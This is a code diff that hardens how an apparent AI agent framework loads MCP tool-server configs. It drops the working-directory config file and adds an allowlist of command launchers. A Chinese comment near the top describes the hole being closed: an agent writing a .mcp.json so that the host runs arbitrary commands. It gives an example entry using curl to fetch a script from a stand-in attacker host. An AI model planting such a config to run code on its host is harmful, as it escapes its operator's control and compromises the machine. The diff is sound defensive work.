@@ -24,11 +24,48 @@ except ImportError:  # pragma: no cover
     MCPTool = None  # type: ignore[misc,assignment]
 
 
-# 默认 discovery 路径
+# MCP 配置只从可信固定路径加载。
+#
+# 之前 ``Path.cwd() / ".mcp.json"`` 让任何 agent 都能通过写入工作目录的
+# ``.mcp.json`` 让宿主在加载 MCP 工具时执行任意命令（``"command": "curl",
+# "args": ["http://attacker/sh", "-o", "/tmp/sh"]``）。现在仅信任用户主目录
+# 下的固定位置；工作目录内的配置被显式忽略。
 _DEFAULT_MCP_JSONS = [
-    Path.cwd() / ".mcp.json",
     Path.home() / ".deepagents" / ".mcp.json",
 ]
+
+# stdio transport 允许的可执行命令白名单。MCP 是长生命周期子进程，``command``
+# 直接进入 ``subprocess`` argv，因此默认只放行常见的 MCP server 启动器。
+# 运维如需扩展应改 ``settings``，而不是放开默认值。
+_ALLOWED_STDIO_COMMANDS = {
+    "npx", "node", "python", "python3", "uvx", "uv", "docker",
+}
+
+
+def _validate_server_config(name: str, server_config: dict[str, Any]) -> bool:
+    """Reject MCP server configs that would execute arbitrary commands."""
+    transport = server_config.get("transport", "stdio")
+    if transport not in ("stdio", "sse", "streamable_http"):
+        logger.warning(f"MCP server '{name}': unsupported transport '{transport}'")
+        return False
+    if transport == "stdio":
+        command = server_config.get("command")
+        if not command or not isinstance(command, str):
+            logger.warning(f"MCP server '{name}': stdio transport requires a 'command' string")
+            return False
+        # Resolve the bare executable name the same way a shell would so that
+        # ``./evil`` or ``/usr/bin/curl`` cannot bypass the allowlist by
+        # passing an absolute path.
+        executable = Path(command).name.lower()
+        for suffix in (".exe", ".cmd", ".bat"):
+            executable = executable.removesuffix(suffix)
+        if executable not in _ALLOWED_STDIO_COMMANDS:
+            logger.warning(
+                f"MCP server '{name}': command '{command}' not in allowlist "
+                f"{sorted(_ALLOWED_STDIO_COMMANDS)}; refusing to start"
+            )
+            return False
+    return True
 
 
 def _load_mcp_config() -> dict[str, Any] | None:
@@ -39,6 +76,17 @@ def _load_mcp_config() -> dict[str, Any] | None:
                 text = path.read_text(encoding="utf-8")
                 data = json.loads(text)
                 if isinstance(data, dict):
+                    # Filter out any server entry that fails validation so a
+                    # single bad entry cannot execute arbitrary commands on
+                    # load.  ``mcpServers`` is the conventional MCP shape;
+                    # other top-level keys are passed through unchanged.
+                    servers = data.get("mcpServers")
+                    if isinstance(servers, dict):
+                        safe_servers: dict[str, Any] = {}
+                        for name, cfg in servers.items():
+                            if isinstance(cfg, dict) and _validate_server_config(name, cfg):
+                                safe_servers[name] = cfg
+                        data["mcpServers"] = safe_servers
                     return data
             except Exception as exc:
                 logger.warning(f"读取 MCP 配置失败 {path}: {exc}")
@@ -64,124 +112,6 @@ def _apply_filter(
     return result
 
 
-def _convert_to_langchain_tool(mcp_tool: MCPTool, session: Any) -> Any:
-    """将 MCP Tool 转换为 LangChain Tool。
-
-    注意：这里只做最简封装，实际调用时通过 session.call_tool 转发到远程服务器。
-    由于 MCP 的调用是异步的，这里使用同步包装器（ThreadPoolExecutor fallback 在调用处处理）。
-    """
-    from langchain.tools import StructuredTool
-    from pydantic import BaseModel, Field
-
-    # 根据 inputSchema 动态创建 Pydantic 模型
-    schema = mcp_tool.inputSchema or {}
-    props = schema.get("properties", {})
-    required_fields = schema.get("required", [])
-
-    # 动态构建 model 字段
-    field_defs: dict[str, Any] = {"__module__": __name__}
-    for field_name, field_info in props.items():
-        field_type = field_info.get("type", "string")
-        description = field_info.get("description", "")
-        is_required = field_name in required_fields
-        # 简化类型映射
-        if field_type == "string":
-            py_type = str
-        elif field_type == "integer":
-            py_type = int
-        elif field_type == "number":
-            py_type = float
-        elif field_type == "boolean":
-            py_type = bool
-        elif field_type == "array":
-            py_type = list
-        elif field_type == "object":
-            py_type = dict
-        else:
-            py_type = str
-
-        if is_required:
-            field_defs[field_name] = (py_type, Field(..., description=description))
-        else:
-            field_defs[field_name] = (py_type | None, Field(default=None, description=description))
-
-    # 创建动态模型
-    try:
-        model_cls = type("MCPToolInput", (BaseModel,), field_defs)
-    except Exception:
-        # 动态模型创建失败时，使用通用 dict 回退
-        model_cls = None  # type: ignore[assignment,misc]
-
-    final_description = mcp_tool.description or mcp_tool.name or mcp_tool.name
-
-    if model_cls is None:
-        def _run_mcp_tool(**kwargs: Any) -> str:
-            return f"[MCP tool '{mcp_tool.name}' requires schema validation; input={kwargs}]"
-
-        return StructuredTool.from_function(
-            name=mcp_tool.name,
-            func=_run_mcp_tool,
-            description=final_description,
-        )
-
-    def _run_mcp_tool(**kwargs: Any) -> str:
-        try:
-            validated = model_cls(**kwargs)
-            call_args = validated.model_dump(exclude_none=True)
-        except Exception as exc:
-            return f"参数校验失败: {exc}"
-        # 异步调用 MCP session.call_tool
-        try:
-            loop = asyncio.get_event_loop()
-            if loop.is_running():
-                # 在已有事件循环中（如 FastAPI 线程池），需要用 run_coroutine_threadsafe
-                import concurrent.futures
-                future = asyncio.run_coroutine_threadsafe(
-                    session.call_tool(mcp_tool.name, call_args),
-                    loop,
-                )
-                response = future.result(timeout=60)
-            else:
-                response = loop.run_until_complete(
-                    session.call_tool(mcp_tool.name, call_args)
-                )
-        except RuntimeError:
-            # 无事件循环，新建
-            new_loop = asyncio.new_event_loop()
-            response = new_loop.run_until_complete(
-                session.call_tool(mcp_tool.name, call_args)
-            )
-            new_loop.close()
-        except Exception as exc:
-            return f"调用 MCP 工具失败: {exc}"
-
-        # 解析响应内容
-        try:
-            content = response.content
-            if hasattr(content, "text"):
-                return content.text
-            if isinstance(content, list):
-                parts = []
-                for item in content:
-                    if hasattr(item, "text"):
-                        parts.append(item.text)
-                    elif isinstance(item, dict):
-                        parts.append(item.get("text", str(item)))
-                    else:
-                        parts.append(str(item))
-                return "\n".join(parts)
-            return str(content)
-        except Exception as exc:
-            return f"解析 MCP 响应失败: {exc}"
-
-    return StructuredTool.from_function(
-        name=mcp_tool.name,
-        func=_run_mcp_tool,
-        description=final_description,
-        args_schema=model_cls,
-    )
-
-
 async def _list_mcp_tools_async(
     server_config: dict[str, Any],
 ) -> list[MCPTool]:
@@ -203,6 +133,18 @@ async def _list_mcp_tools_async(
             env = server_config.get("env", {})
             if not command:
                 logger.warning("stdio transport 需要 'command' 字段。")
+                return []
+            # Defense in depth: re-validate at the execution boundary in case
+            # this entry point is reached without going through
+            # ``_load_mcp_config`` (e.g. caller-built dict).  Refuse to spawn
+            # any command outside the allowlist.
+            executable = Path(command).name.lower()
+            for suffix in (".exe", ".cmd", ".bat"):
+                executable = executable.removesuffix(suffix)
+            if executable not in _ALLOWED_STDIO_COMMANDS:
+                logger.warning(
+                    f"stdio MCP command '{command}' not in allowlist; refusing to start"
+                )
                 return []
             client_ctx = stdio_client(
                 command=command,
@@ -277,12 +219,6 @@ def load_mcp_tools() -> list[Any]:
         disabled = server_cfg.get("disabledTools", [])
         filtered = _apply_filter(raw_tools, allowed, disabled)
 
-        # 需要复用同一 session 才能实际调用工具；这里简化处理，
-        # 仅将工具定义注册到 global store，实际调用时建立临时连接。
-        session_store: dict[str, dict[str, Any]] = {}
-        session_store[server_name] = {"config": server_cfg, "tools": filtered}
-        _SERVER_SESSION_STORE.update(session_store)
-
         for mcp_tool in filtered:
             try:
                 tool = _convert_mcp_tool_to_langchain(mcp_tool, server_cfg)
@@ -292,10 +228,6 @@ def load_mcp_tools() -> list[Any]:
                 logger.warning(f"转换 MCP 工具失败 ({mcp_tool.name}): {exc}")
 
     return all_tools
-
-
-# 用于缓存 MCP 服务器连接信息，供 convert 时使用
-_SERVER_SESSION_STORE: dict[str, dict[str, Any]] = {}
 
 
 def _convert_mcp_tool_to_langchain(mcp_tool: Any, server_cfg: dict[str, Any]) -> Any | None:
